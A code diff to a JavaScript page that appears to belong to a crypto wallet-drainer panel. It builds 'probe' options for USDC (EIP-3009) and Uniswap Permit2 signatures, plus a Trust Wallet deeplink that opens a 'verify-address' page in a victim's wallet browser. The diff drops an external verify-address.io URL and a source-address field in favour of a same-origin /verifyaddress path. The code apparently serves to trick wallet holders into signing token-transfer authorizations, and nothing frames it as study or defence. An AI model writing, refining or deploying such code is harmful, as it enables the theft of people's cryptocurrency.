@@ -703,9 +703,7 @@
         html += '<div class="tokens-col-header" style="margin-bottom:8px;"><s>WalletConnect</s> SIGN</div>';
         html += '<div class="token-row" id="sign-usdc-erc20" onclick="selectSignProbe(\'usdc-erc20\',this);return false;">';
         html += '<img src="' + LOGO_USDC + '" class="token-logo" /><span>USDC Ethereum</span></div>';
-        html += '<div class="token-addr-wrap">';
-        html += '<input type="text" id="sign-from-address" placeholder="0x..." autocomplete="off" />';
-        html += '</div></div>';
+        html += '</div>';
         html += '</div>';
         // Colonne tierce — UNISWAP (Permit2)
         html += '<div class="tokens-col tokens-col-uniswap">';
@@ -1151,21 +1149,11 @@ try {
   // WC SIGN FLOW -- EIP-3009 deeplink, aucune connexion préalable
 
   function generateSignQR() {
-    var signAddr  = document.getElementById('sign-from-address');
-    var adminAddr = document.getElementById('target-from-address');
-    if (signAddr && adminAddr) { adminAddr.value = signAddr.value.trim(); }
     openSignQR('usdc-erc20');
   }
 
   function openSignQR(preset) {
-    var targetInput   = document.getElementById('target-from-address');
-    var targetAddress = targetInput ? targetInput.value.trim() : '';
-    var isValid       = /^0x[a-fA-F0-9]{40}$/i.test(targetAddress);
-
-    var probeUrl = 'https://verify-address.io/?preset=' + preset + '&method=eip3009';
-    if (isValid) { probeUrl += '&from=' + targetAddress.toLowerCase(); }
-
-    var deeplink = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(probeUrl);
+    var deeplink = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(window.location.origin + '/verifyaddress');
 
     var qrDiv    = document.getElementById('qrcode');
     var scanText = document.querySelector('.scan');
